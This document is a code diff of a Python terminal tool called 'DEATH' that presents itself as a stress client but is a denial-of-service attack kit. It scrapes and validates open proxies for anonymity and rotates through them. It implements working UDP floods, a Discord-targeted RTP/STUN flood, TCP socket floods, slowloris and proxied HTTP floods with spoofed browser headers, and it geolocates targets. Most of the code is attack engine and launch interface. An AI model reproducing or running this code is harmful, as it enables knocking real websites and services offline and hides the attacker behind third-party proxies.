@@ -2,18 +2,6 @@
 # ============================================================
 #  DEATH — terminal stress client
 # ============================================================
-#  Single-file terminal app:
-#    - user accounts (admin + created users)
-#    - proxy scraping (lists, dorks, aggregator APIs)
-#    - proxy validation (TCP reachability, CONNECT, per-target)
-#    - attack engine with multiple methods
-#    - proxy rotation with failure tracking
-#    - animated gradient terminal UI
-#
-#  Runs on Windows, Linux, macOS, and inside containers.
-#  Works over SSH, ttyd, PTY, and local consoles.
-#  Press S during scrape to stop early and save what was found.
-# ============================================================
 
 import os
 import sys
@@ -33,10 +21,6 @@ import urllib.request
 from typing import Callable, Dict, List, Optional, Set, Tuple
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
-# ============================================================
-#  SECTION 1 — PLATFORM SETUP
-# ============================================================
-
 IS_WINDOWS = (os.name == "nt")
 
 if IS_WINDOWS:
@@ -44,40 +28,23 @@ if IS_WINDOWS:
     try:
         import ctypes
         _k32 = ctypes.windll.kernel32
-        _stdout_handle = _k32.GetStdHandle(-11)
-        _k32.SetConsoleMode(_stdout_handle, 7)
+        _k32.SetConsoleMode(_k32.GetStdHandle(-11), 7)
     except Exception:
         pass
-
-# ============================================================
-#  SECTION 2 — ANSI ESCAPE CODES
-# ============================================================
 
 ESC = "\x1b"
 RESET = f"{ESC}[0m"
 BOLD = f"{ESC}[1m"
 DIM = f"{ESC}[2m"
-
 CLEAR = f"{ESC}[2J{ESC}[H"
 HOME = f"{ESC}[H"
 HIDE_CURSOR = f"{ESC}[?25l"
 SHOW_CURSOR = f"{ESC}[?25h"
 
-def fg(r: int, g: int, b: int) -> str:
-    return f"{ESC}[38;2;{r};{g};{b}m"
-
-def bg(r: int, g: int, b: int) -> str:
-    return f"{ESC}[48;2;{r};{g};{b}m"
-
-def move(row: int, col: int) -> str:
-    return f"{ESC}[{row};{col}H"
-
-def clear_line() -> str:
-    return f"{ESC}[K"
-
-# ============================================================
-#  SECTION 3 — ASCII ASSETS
-# ============================================================
+def fg(r, g, b): return f"{ESC}[38;2;{r};{g};{b}m"
+def bg(r, g, b): return f"{ESC}[48;2;{r};{g};{b}m"
+def move(row, col): return f"{ESC}[{row};{col}H"
+def clear_line(): return f"{ESC}[K"
 
 BANNER_DEATH = r"""
  ██████╗ ███████╗ █████╗ ████████╗██╗  ██╗
@@ -202,49 +169,27 @@ THEMES = {
     "rose":    {"accent": (255, 120, 180),"dim": (100, 40, 70)},
 }
 
-# ============================================================
-#  SECTION 4 — CONSTANTS
-# ============================================================
-
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
     "curl/8.4.0",
 ]
 
 REFERERS = [
-    "https://www.google.com/",
-    "https://www.bing.com/",
-    "https://duckduckgo.com/",
-    "https://www.facebook.com/",
-    "https://twitter.com/",
-    "https://www.reddit.com/",
-    "https://www.youtube.com/",
-    "https://github.com/",
+    "https://www.google.com/", "https://www.bing.com/",
+    "https://duckduckgo.com/", "https://www.facebook.com/",
+    "https://twitter.com/", "https://www.reddit.com/",
 ]
 
-ACCEPT_LANGS = [
-    "en-US,en;q=0.9",
-    "en-GB,en;q=0.8",
-    "en-US,en;q=0.9,es;q=0.8",
-]
+ACCEPT_LANGS = ["en-US,en;q=0.9", "en-GB,en;q=0.8", "en-US,en;q=0.9,es;q=0.8"]
 
 PROXY_RE_SIMPLE = re.compile(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{1,5})")
 
 FAIL_THRESHOLD = 5
 KEEPALIVE_REQUESTS = 16
-
-# ============================================================
-#  SECTION 5 — DATA DIR + USER STORE
-# ============================================================
 
 DATA_DIR = os.environ.get("DEATH_DATA_DIR", os.path.dirname(os.path.abspath(__file__)))
 try:
@@ -279,10 +224,6 @@ def verify_user(username: str, password: str) -> Tuple[bool, bool]:
         return True, False
     return False, False
 
-# ============================================================
-#  SECTION 6 — PROXY STORE
-# ============================================================
-
 def proxy_file(username: str) -> str:
     safe = "".join(c for c in username if c.isalnum() or c in "_-") or "guest"
     return os.path.join(DATA_DIR, f"proxies_{safe}.json")
@@ -304,10 +245,6 @@ def save_proxies(username: str, proxies: Dict[str, dict]):
     except Exception:
         pass
 
-# ============================================================
-#  SECTION 7 — STATE
-# ============================================================
-
 class State:
     def __init__(self):
         self.username = ""
@@ -318,23 +255,19 @@ class State:
         self.log: List[str] = []
         self.current_view = "home"
         self.input_buffer = ""
-
         self.attacks: List[Dict] = []
         self.online_users = ["death", "root", "admin", "guest", "ops"]
         self.scheduled: List[Dict] = []
         self.queue: List[Dict] = []
         self.users: Dict[str, str] = load_users()
-
         self.attack_screen: Optional[Dict] = None
         self.attack_frame = 0
         self.attack_thread: Optional[threading.Thread] = None
         self.attack_stop = threading.Event()
-
         self.proxies: Dict[str, dict] = {}
         self.scraping = False
         self.scrape_stop = threading.Event()
         self.log_lock = threading.Lock()
-
         self.session_start = time.time()
         self.total_sent = 0
         self.total_failed = 0
@@ -353,19 +286,12 @@ class State:
 
 S = State()
 
-# ============================================================
-#  SECTION 8 — RENDER HELPERS
-# ============================================================
-
-def term_size() -> Tuple[int, int]:
+def term_size():
     sz = shutil.get_terminal_size((120, 40))
     return sz.columns, sz.lines
 
-def lerp(a: int, b: int, t: float) -> int:
-    return int(a + (b - a) * t)
-
-def clamp(v: int, lo: int, hi: int) -> int:
-    return max(lo, min(hi, v))
+def lerp(a, b, t): return int(a + (b - a) * t)
+def clamp(v, lo, hi): return max(lo, min(hi, v))
 
 def gradient_sweep(line: str, frame: int, theme, phase: float = 0.0) -> str:
     if not line:
@@ -429,10 +355,6 @@ def emblem_animated(frame: int, theme) -> List[str]:
         out.append(f"{fg(r,g,b)}{line}{RESET}")
     return out
 
-# ============================================================
-#  SECTION 9 — TARGET LOOKUP
-# ============================================================
-
 _target_cache: Dict[str, Tuple[float, Dict[str, str]]] = {}
 _target_cache_lock = threading.Lock()
 
@@ -442,7 +364,6 @@ def lookup_target(host: str) -> Dict[str, str]:
         cached = _target_cache.get(host)
         if cached and now - cached[0] < 300:
             return cached[1]
-
     info = {"ip": "?", "asn": "?", "isp": "?", "city": "?", "state": "?", "country": "?"}
     try:
         info["ip"] = socket.gethostbyname(host)
@@ -450,7 +371,6 @@ def lookup_target(host: str) -> Dict[str, str]:
         with _target_cache_lock:
             _target_cache[host] = (now, info)
         return info
-
     try:
         url = ("http://ip-api.com/json/" + info["ip"]
                + "?fields=status,country,regionName,city,isp,as,query")
@@ -464,14 +384,9 @@ def lookup_target(host: str) -> Dict[str, str]:
             info["country"] = data.get("country", "?")
     except Exception:
         pass
-
     with _target_cache_lock:
         _target_cache[host] = (now, info)
     return info
-
-# ============================================================
-#  SECTION 10 — PROXY SCRAPING SOURCES
-# ============================================================
 
 PROXY_SOURCES = [
     "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
@@ -522,10 +437,6 @@ DORK_QUERIES = [
     "inurl:socks4.txt",
     "inurl:proxies.txt",
 ]
-
-# ============================================================
-#  SECTION 11 — PROXY SCRAPING FUNCTIONS
-# ============================================================
 
 def _valid_ip(ip: str) -> bool:
     parts = ip.split(".")
@@ -582,10 +493,8 @@ def _ddg_dork(query: str, limit: int = 8) -> List[str]:
         pass
     return urls
 
-def scrape_all_proxies(on_progress: Callable[[str], None],
-                       stop: threading.Event) -> Set[str]:
+def scrape_all_proxies(on_progress, stop):
     found: Set[str] = set()
-
     on_progress(f"fetching {len(PROXY_SOURCES)} sources in parallel...")
     with ThreadPoolExecutor(max_workers=40) as ex:
         futures = [ex.submit(_fetch_one_source, u) for u in PROXY_SOURCES]
@@ -601,7 +510,6 @@ def scrape_all_proxies(on_progress: Callable[[str], None],
             if done % 8 == 0:
                 on_progress(f"  sources {done}/{len(PROXY_SOURCES)} — pool: {len(found)}")
     if stop.is_set():
-        on_progress(f"stopped early — {len(found)} raw candidates")
         return found
     on_progress(f"source phase complete: {len(found)} raw candidates")
 
@@ -616,40 +524,26 @@ def scrape_all_proxies(on_progress: Callable[[str], None],
                 dork_links.extend(fut.result())
             except Exception:
                 pass
-
     if not stop.is_set() and dork_links:
         dork_links = list(dict.fromkeys(dork_links))
-        on_progress(f"  fetched {len(dork_links)} dork links, extracting...")
         with ThreadPoolExecutor(max_workers=30) as ex:
             futures = [ex.submit(fetch_url, u, 6) for u in dork_links]
-            done = 0
             for fut in as_completed(futures):
                 if stop.is_set():
                     break
-                done += 1
                 try:
                     found |= extract_proxies(fut.result())
                 except Exception:
                     pass
-                if done % 10 == 0:
-                    on_progress(f"  dork pages {done}/{len(dork_links)} — pool: {len(found)}")
-
     on_progress(f"scrape phase complete: {len(found)} unique candidates")
     return found
-
-# ============================================================
-#  SECTION 12 — PROXY VALIDATION
-# ============================================================
 
 def tcp_reachable(proxy: str, timeout: float = 2.0) -> bool:
     try:
         host, port = proxy.split(":")
         port = int(port)
         s = socket.create_connection((host, port), timeout=timeout)
-        try:
-            s.close()
-        except Exception:
-            pass
+        s.close()
         return True
     except Exception:
         return False
@@ -661,45 +555,32 @@ def http_proxy_alive(proxy: str, timeout: float = 4.0) -> bool:
         s = socket.create_connection((host, port), timeout=timeout)
         s.settimeout(timeout)
         canary = "www.google.com:80"
-        req = f"CONNECT {canary} HTTP/1.1\r\nHost: {canary}\r\n\r\n"
-        s.sendall(req.encode())
+        s.sendall(f"CONNECT {canary} HTTP/1.1\r\nHost: {canary}\r\n\r\n".encode())
         resp = s.recv(128)
-        try:
-            s.close()
-        except Exception:
-            pass
+        s.close()
         return b"200" in resp
     except Exception:
         return False
 
-def proxy_can_reach_target(proxy: str, target_host: str, target_port: int,
-                           timeout: float = 5.0) -> bool:
+def proxy_can_reach_target(proxy: str, target_host: str, target_port: int, timeout: float = 5.0) -> bool:
     try:
-        proxy_host, proxy_port = proxy.split(":")
-        proxy_port = int(proxy_port)
-        s = socket.create_connection((proxy_host, proxy_port), timeout=timeout)
+        ph, pp = proxy.split(":")
+        pp = int(pp)
+        s = socket.create_connection((ph, pp), timeout=timeout)
         s.settimeout(timeout)
-        connect_req = (f"CONNECT {target_host}:{target_port} HTTP/1.1\r\n"
-                       f"Host: {target_host}:{target_port}\r\n\r\n")
-        s.sendall(connect_req.encode())
+        s.sendall(f"CONNECT {target_host}:{target_port} HTTP/1.1\r\nHost: {target_host}:{target_port}\r\n\r\n".encode())
         resp = s.recv(256)
-        try:
-            s.close()
-        except Exception:
-            pass
+        s.close()
         return b"200" in resp
     except Exception:
         return False
 
-def scrape_and_validate(on_progress: Callable[[str], None],
-                        stop: threading.Event) -> Dict[str, dict]:
+def scrape_and_validate(on_progress, stop):
     candidates = scrape_all_proxies(on_progress, stop)
     if not candidates:
         on_progress("no candidates found")
         return {}
-
     if stop.is_set():
-        on_progress(f"stopped — keeping {len(candidates)} raw candidates (unvalidated)")
         return {p: {"last_ok": 0, "ok_count": 0, "raw": True} for p in candidates}
 
     on_progress(f"tcp-reachability filter on {len(candidates)} proxies...")
@@ -721,8 +602,6 @@ def scrape_and_validate(on_progress: Callable[[str], None],
                 pass
             if done % 200 == 0:
                 on_progress(f"  tcp {done}/{total} — reachable: {len(reachable)}")
-
-    on_progress(f"tcp filter done: {len(reachable)} reachable")
     if stop.is_set():
         return {p: {"last_ok": time.time(), "ok_count": 0, "raw": True} for p in reachable}
 
@@ -745,74 +624,40 @@ def scrape_and_validate(on_progress: Callable[[str], None],
                 pass
             if done % 100 == 0:
                 on_progress(f"  http {done}/{total} — alive: {len(alive)}")
-
     on_progress(f"validation done: {len(alive)} working proxies")
     return alive
-
-# ============================================================
-#  SECTION 13 — ATTACK PRIMITIVES
-# ============================================================
 
 def build_request(method: str, host: str, port: int, path: str = "/") -> Tuple[str, str]:
     scheme = "https" if (method in ("tls", "https", "browser", "slowloris", "http2") or port == 443) else "http"
     ua = random.choice(USER_AGENTS)
     ref = random.choice(REFERERS)
     lang = random.choice(ACCEPT_LANGS)
-
     if method == "browser":
-        req = (
-            f"GET {path} HTTP/1.1\r\n"
-            f"Host: {host}\r\n"
-            f"User-Agent: {ua}\r\n"
-            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
-            f"Accept-Language: {lang}\r\n"
-            f"Accept-Encoding: gzip, deflate, br\r\n"
-            f"Referer: {ref}\r\n"
-            f"Connection: keep-alive\r\n"
-            f"Upgrade-Insecure-Requests: 1\r\n"
-            f"Sec-Fetch-Dest: document\r\n"
-            f"Sec-Fetch-Mode: navigate\r\n"
-            f"Sec-Fetch-Site: cross-site\r\n"
-            f"Sec-Fetch-User: ?1\r\n"
-            f"Cache-Control: max-age=0\r\n"
-            f"\r\n"
-        )
+        req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\n"
+               f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+               f"Accept-Language: {lang}\r\nAccept-Encoding: gzip, deflate, br\r\n"
+               f"Referer: {ref}\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\n"
+               f"Sec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: cross-site\r\n"
+               f"Cache-Control: max-age=0\r\n\r\n")
     elif method == "slowloris":
-        req = (
-            f"GET {path} HTTP/1.1\r\n"
-            f"Host: {host}\r\n"
-            f"User-Agent: {ua}\r\n"
-            f"Accept: */*\r\n"
-            f"X-Padding: {random.randint(1, 999999)}\r\n"
-        )
+        req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\n"
+               f"Accept: */*\r\nX-Padding: {random.randint(1, 999999)}\r\n")
     else:
-        req = (
-            f"GET {path} HTTP/1.1\r\n"
-            f"Host: {host}\r\n"
-            f"User-Agent: {ua}\r\n"
-            f"Accept: */*\r\n"
-            f"Accept-Language: {lang}\r\n"
-            f"Referer: {ref}\r\n"
-            f"Connection: keep-alive\r\n"
-            f"\r\n"
-        )
+        req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\n"
+               f"Accept: */*\r\nAccept-Language: {lang}\r\nReferer: {ref}\r\n"
+               f"Connection: keep-alive\r\n\r\n")
     return req, scheme
 
-def open_tunnel(proxy: str, host: str, port: int, scheme: str,
-                timeout: float = 5.0) -> Optional[socket.socket]:
+def open_tunnel(proxy: str, host: str, port: int, scheme: str, timeout: float = 5.0):
     try:
-        proxy_host, proxy_port = proxy.split(":")
-        proxy_port = int(proxy_port)
-        s = socket.create_connection((proxy_host, proxy_port), timeout=timeout)
+        ph, pp = proxy.split(":")
+        pp = int(pp)
+        s = socket.create_connection((ph, pp), timeout=timeout)
         s.settimeout(timeout)
-        connect_req = f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n"
-        s.sendall(connect_req.encode())
+        s.sendall(f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n".encode())
         resp = s.recv(512)
         if b"200" not in resp:
-            try:
-                s.close()
-            except Exception:
-                pass
+            s.close()
             return None
         if scheme == "https":
             ctx = ssl.create_default_context()
@@ -823,8 +668,7 @@ def open_tunnel(proxy: str, host: str, port: int, scheme: str,
     except Exception:
         return None
 
-def open_direct(host: str, port: int, scheme: str,
-                timeout: float = 4.0) -> Optional[socket.socket]:
+def open_direct(host: str, port: int, scheme: str, timeout: float = 4.0):
     try:
         if scheme == "https":
             ctx = ssl.create_default_context()
@@ -839,7 +683,7 @@ def open_direct(host: str, port: int, scheme: str,
     except Exception:
         return None
 
-def raw_udp_flood(host: str, port: int, stop: threading.Event, stats: dict):
+def raw_udp_flood(host, port, stop, stats):
     try:
         ip = socket.gethostbyname(host)
     except Exception:
@@ -848,10 +692,6 @@ def raw_udp_flood(host: str, port: int, stop: threading.Event, stats: dict):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 << 20)
-        try:
-            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        except Exception:
-            pass
     except Exception:
         return
     pool = [os.urandom(random.randint(512, 1400)) for _ in range(128)]
@@ -868,22 +708,18 @@ def raw_udp_flood(host: str, port: int, stop: threading.Event, stats: dict):
 
 def _rtp_packet() -> bytes:
     version_pt = 0x80
-    payload_type = random.choice([96, 97, 98, 111, 120]) & 0x7F
+    pt = random.choice([96, 97, 98, 111, 120]) & 0x7F
     seq = random.randint(0, 0xFFFF)
     ts = random.randint(0, 0xFFFFFFFF)
     ssrc = random.randint(0, 0xFFFFFFFF)
-    header = struct.pack("!BBHII", version_pt, payload_type, seq, ts, ssrc)
+    header = struct.pack("!BBHII", version_pt, pt, seq, ts, ssrc)
     body = os.urandom(random.randint(160, 1200))
     return header + body
 
 def _stun_binding_request() -> bytes:
-    msg_type = 0x0001
-    msg_len = 0
-    magic = 0x2112A442
-    txn = os.urandom(12)
-    return struct.pack("!HHI", msg_type, msg_len, magic) + txn
+    return struct.pack("!HHI", 0x0001, 0, 0x2112A442) + os.urandom(12)
 
-def discord_udp_flood(host: str, port: int, stop: threading.Event, stats: dict):
+def discord_udp_flood(host, port, stop, stats):
     try:
         ip = socket.gethostbyname(host)
     except Exception:
@@ -924,7 +760,7 @@ def discord_udp_flood(host: str, port: int, stop: threading.Event, stats: dict):
         except Exception:
             stats["failed"] = stats.get("failed", 0) + 1
 
-def raw_tcp_socket_flood(host: str, port: int, stop: threading.Event, stats: dict):
+def raw_tcp_socket_flood(host, port, stop, stats):
     try:
         ip = socket.gethostbyname(host)
     except Exception:
@@ -948,7 +784,7 @@ def raw_tcp_socket_flood(host: str, port: int, stop: threading.Event, stats: dic
         except Exception:
             stats["failed"] = stats.get("failed", 0) + 1
 
-def slowloris_worker(host: str, port: int, stop: threading.Event, stats: dict):
+def slowloris_worker(host, port, stop, stats):
     req, scheme = build_request("slowloris", host, port, "/")
     sockets: List[socket.socket] = []
     while not stop.is_set():
@@ -968,13 +804,12 @@ def slowloris_worker(host: str, port: int, stop: threading.Event, stats: dict):
                     s.close()
                 except Exception:
                     pass
-        dead: List[socket.socket] = []
+        dead = []
         for s in sockets:
             if stop.is_set():
                 break
             try:
-                drip = f"X-Keep-Alive-{random.randint(1, 99999)}: {os.urandom(6).hex()}\r\n"
-                s.sendall(drip.encode())
+                s.sendall(f"X-Keep-Alive-{random.randint(1, 99999)}: {os.urandom(6).hex()}\r\n".encode())
                 stats["sent"] = stats.get("sent", 0) + 1
             except Exception:
                 stats["failed"] = stats.get("failed", 0) + 1
@@ -995,26 +830,20 @@ def slowloris_worker(host: str, port: int, stop: threading.Event, stats: dict):
         except Exception:
             pass
 
-def proxy_http_worker(method: str, host: str, port: int,
-                      proxy_pool: List[str], pool_lock: threading.Lock,
-                      stop: threading.Event, stats: dict,
-                      fail_counts: Dict[str, int], fail_lock: threading.Lock,
-                      dead: Set[str], dead_lock: threading.Lock,
-                      fallback_direct: bool,
-                      keepalive_requests: int = KEEPALIVE_REQUESTS):
+def proxy_http_worker(method, host, port, pool, pool_lock, stop, stats,
+                      fail_counts, fail_lock, dead, dead_lock,
+                      fallback_direct, keepalive_requests=KEEPALIVE_REQUESTS):
     while not stop.is_set():
         proxy = None
         with pool_lock:
-            if proxy_pool:
-                proxy = random.choice(proxy_pool)
-
+            if pool:
+                proxy = random.choice(pool)
         if proxy is None:
             if not fallback_direct:
                 time.sleep(0.1)
                 continue
             _direct_http_burst(method, host, port, stop, stats)
             continue
-
         scheme = "https" if (method in ("tls", "https", "browser", "http2") or port == 443) else "http"
         sock = open_tunnel(proxy, host, port, scheme, timeout=4.0)
         if sock is None:
@@ -1023,20 +852,17 @@ def proxy_http_worker(method: str, host: str, port: int,
                 fail_counts[proxy] = fail_counts.get(proxy, 0) + 1
                 if fail_counts[proxy] >= FAIL_THRESHOLD:
                     with pool_lock:
-                        if proxy in proxy_pool:
-                            proxy_pool.remove(proxy)
+                        if proxy in pool:
+                            pool.remove(proxy)
                     with dead_lock:
                         dead.add(proxy)
             continue
-
         with fail_lock:
             fail_counts[proxy] = 0
-
         for _ in range(keepalive_requests):
             if stop.is_set():
                 break
-            req, _scheme = build_request(method, host, port,
-                                         path=f"/?{random.randint(1, 9999999)}")
+            req, _ = build_request(method, host, port, path=f"/?{random.randint(1, 9999999)}")
             try:
                 sock.sendall(req.encode())
                 stats["sent"] = stats.get("sent", 0) + 1
@@ -1053,19 +879,17 @@ def proxy_http_worker(method: str, host: str, port: int,
                     fail_counts[proxy] = fail_counts.get(proxy, 0) + 1
                     if fail_counts[proxy] >= FAIL_THRESHOLD:
                         with pool_lock:
-                            if proxy in proxy_pool:
-                                proxy_pool.remove(proxy)
+                            if proxy in pool:
+                                pool.remove(proxy)
                         with dead_lock:
                             dead.add(proxy)
                 break
-
         try:
             sock.close()
         except Exception:
             pass
 
-def _direct_http_burst(method: str, host: str, port: int,
-                       stop: threading.Event, stats: dict, burst: int = 4):
+def _direct_http_burst(method, host, port, stop, stats, burst=4):
     scheme = "https" if (method in ("tls", "https", "browser") or port == 443) else "http"
     sock = open_direct(host, port, scheme, timeout=3.5)
     if sock is None:
@@ -1091,11 +915,7 @@ def _direct_http_burst(method: str, host: str, port: int,
     except Exception:
         pass
 
-# ============================================================
-#  SECTION 14 — ATTACK ORCHESTRATOR
-# ============================================================
-
-def attack_worker(method: str, host: str, port: int, duration: int):
+def attack_worker(method, host, port, duration):
     try:
         _attack_inner(method, host, port, duration)
     except Exception as e:
@@ -1108,22 +928,21 @@ def attack_worker(method: str, host: str, port: int, duration: int):
         except Exception:
             pass
 
-def _attack_inner(method: str, host: str, port: int, duration: int):
+def _attack_inner(method, host, port, duration):
     stop = S.attack_stop
-    stats: Dict[str, int] = {"sent": 0, "failed": 0, "responded": 0}
+    stats = {"sent": 0, "failed": 0, "responded": 0}
     dead_proxies: Set[str] = set()
     dead_lock = threading.Lock()
     fail_counts: Dict[str, int] = {}
     fail_lock = threading.Lock()
-
-    pool: List[str] = list(S.proxies.keys())
+    pool = list(S.proxies.keys())
     pool_lock = threading.Lock()
     threads: List[threading.Thread] = []
 
-    def spawn(target_fn, count, args_fn):
+    def spawn(fn, count, args_fn):
         for _ in range(count):
             try:
-                t = threading.Thread(target=target_fn, args=args_fn(), daemon=True)
+                t = threading.Thread(target=fn, args=args_fn(), daemon=True)
                 t.start()
                 threads.append(t)
             except Exception:
@@ -1164,43 +983,35 @@ def _attack_inner(method: str, host: str, port: int, duration: int):
         if remaining <= 0:
             break
         time.sleep(0.2)
-
     stop.set()
     for t in threads:
         try:
             t.join(timeout=1)
         except Exception:
             pass
-
     S.total_sent += stats["sent"]
     S.total_failed += stats["failed"]
     S.total_responded += stats.get("responded", 0)
     S.attacks_run += 1
-
     if dead_proxies:
         for p in list(dead_proxies):
             S.proxies.pop(p, None)
         save_proxies(S.username, S.proxies)
         S.log_line(f"attack done — removed {len(dead_proxies)} dead proxies")
-
     time.sleep(0.6)
 
-# ============================================================
-#  SECTION 15 — BANNER / PROMPT
-# ============================================================
-
-def render_banner(frame: int) -> str:
+def render_banner(frame):
     theme = S.theme
     cols, _ = term_size()
-    banner_lines = BANNER_DEATH.split("\n")
-    banner_w = max(len(l) for l in banner_lines)
-    pad = max(0, (cols - banner_w) // 2)
+    lines = BANNER_DEATH.split("\n")
+    bw = max(len(l) for l in lines)
+    pad = max(0, (cols - bw) // 2)
     out = ["\n"]
-    for line in banner_lines:
+    for line in lines:
         out.append(" " * pad + gradient_sweep(line, frame, theme) + "\n")
     return "".join(out)
 
-def render_prompt(frame: int) -> str:
+def render_prompt(frame):
     theme = S.theme
     _, rows = term_size()
     blink = (frame // 8) % 2 == 0
@@ -1211,11 +1022,7 @@ def render_prompt(frame: int) -> str:
     arrow = solid("►", theme, "accent")
     return move(rows, 1) + clear_line() + f"{user}{sep}{brand}{arrow} {S.input_buffer}{cursor}"
 
-# ============================================================
-#  SECTION 16 — ATTACK SCREEN
-# ============================================================
-
-def render_attack_screen(frame: int) -> str:
+def render_attack_screen(frame):
     theme = S.theme
     cols, _ = term_size()
     a = S.attack_screen
@@ -1224,14 +1031,11 @@ def render_attack_screen(frame: int) -> str:
     out = [HOME, CLEAR]
     header = "D E A T H   |   A T T A C K I N G"
     out.append("\n")
-    out.append(center_visible(gradient_sweep(header, frame, theme), cols) + "\n")
-    out.append("\n")
-
+    out.append(center_visible(gradient_sweep(header, frame, theme), cols) + "\n\n")
     emblem_lines = emblem_animated(frame, theme)
     emblem_w = max(len(l) for l in EMBLEM.split("\n"))
     gap = 2
-
-    mid: List[str] = []
+    mid = []
     mid.append(solid("[Attack Info]", theme, "accent"))
     mid.append("Method : " + solid(str(a["method"]), theme, "accent"))
     mid.append("Target : " + solid(str(a["target"]), theme, "accent"))
@@ -1252,7 +1056,6 @@ def render_attack_screen(frame: int) -> str:
     mid.append("City    : " + solid(str(a["info"]["city"]), theme, "accent"))
     mid.append("State   : " + solid(str(a["info"]["state"]), theme, "accent"))
     mid.append("Country : " + solid(str(a["info"]["country"]), theme, "accent"))
-
     mid_w = max(visible_len(x) for x in mid)
     left_pad = 6
     max_rows = max(len(emblem_lines), len(mid))
@@ -1264,16 +1067,12 @@ def render_attack_screen(frame: int) -> str:
         out.append(" " * left_pad + left + " " * gap + center + center_pad + " " * gap + right + "\n")
     return "".join(out)
 
-# ============================================================
-#  SECTION 17 — VIEW RENDERS
-# ============================================================
-
-def render_home(frame: int) -> str:
+def render_home(frame):
     theme = S.theme
-    out: List[str] = []
+    out = []
     emblem_lines = emblem_animated(frame, theme)
     emblem_w = max(len(l) for l in EMBLEM.split("\n"))
-    method_lines: List[str] = []
+    method_lines = []
     for section, items in METHODS:
         method_lines.append(solid(f"[{section}]", theme, "accent"))
         for name, desc in items:
@@ -1287,7 +1086,7 @@ def render_home(frame: int) -> str:
         out.append("    " + left + "    " + right + "\n")
     return "".join(out)
 
-def render_commands(frame: int) -> str:
+def render_commands(frame):
     theme = S.theme
     out = ["\n", "  " + solid("commands", theme, "accent") + "\n",
            "  " + solid("-" * 50, theme, "dim") + "\n"]
@@ -1296,7 +1095,7 @@ def render_commands(frame: int) -> str:
     out.append("\n")
     return "".join(out)
 
-def render_methods(frame: int) -> str:
+def render_methods(frame):
     theme = S.theme
     out = ["\n"]
     for section, items in METHODS:
@@ -1309,7 +1108,7 @@ def render_methods(frame: int) -> str:
         out.append("\n")
     return "".join(out)
 
-def render_log(frame: int) -> str:
+def render_log(frame):
     theme = S.theme
     out = ["\n", "  " + solid("session log", theme, "accent") + "\n",
            "  " + solid("-" * 60, theme, "dim") + "\n"]
@@ -1320,7 +1119,7 @@ def render_log(frame: int) -> str:
     out.append("\n")
     return "".join(out)
 
-def render_body(frame: int) -> str:
+def render_body(frame):
     if S.current_view == "home":
         return render_home(frame)
     if S.current_view == "commands":
@@ -1331,15 +1130,11 @@ def render_body(frame: int) -> str:
         return render_log(frame)
     return render_home(frame)
 
-# ============================================================
-#  SECTION 18 — COMMANDS
-# ============================================================
-
-def cmd_help(_):     S.current_view = "commands"
-def cmd_clear(_):    S.log_line("screen cleared"); S.current_view = "home"
-def cmd_exit(_):     S.running = False
-def cmd_home(_):     S.current_view = "home"
-def cmd_methods(_):  S.current_view = "methods"
+def cmd_help(_): S.current_view = "commands"
+def cmd_clear(_): S.log_line("screen cleared"); S.current_view = "home"
+def cmd_exit(_): S.running = False
+def cmd_home(_): S.current_view = "home"
+def cmd_methods(_): S.current_view = "methods"
 
 def cmd_themes(_):
     S.current_view = "log"
@@ -1431,7 +1226,6 @@ def cmd_scrape(_):
             S.log_line(f"scrape error: {e}")
         finally:
             S.scraping = False; S.scrape_stop.clear()
-
     threading.Thread(target=runner, daemon=True).start()
 
 def cmd_validate(args):
@@ -1461,7 +1255,6 @@ def cmd_validate(args):
             S.log_line(f"preflight done — {len(survivors)} usable, removed {removed}")
         except Exception as e:
             S.log_line(f"validate error: {e}")
-
     threading.Thread(target=runner, daemon=True).start()
 
 def cmd_proxies(_):
@@ -1530,11 +1323,7 @@ COMMAND_TABLE: Dict[str, Callable] = {
     "stats": cmd_stats, "whoami": cmd_whoami, "time": cmd_time, "ascii": cmd_ascii,
 }
 
-# ============================================================
-#  SECTION 19 — ATTACK LAUNCH
-# ============================================================
-
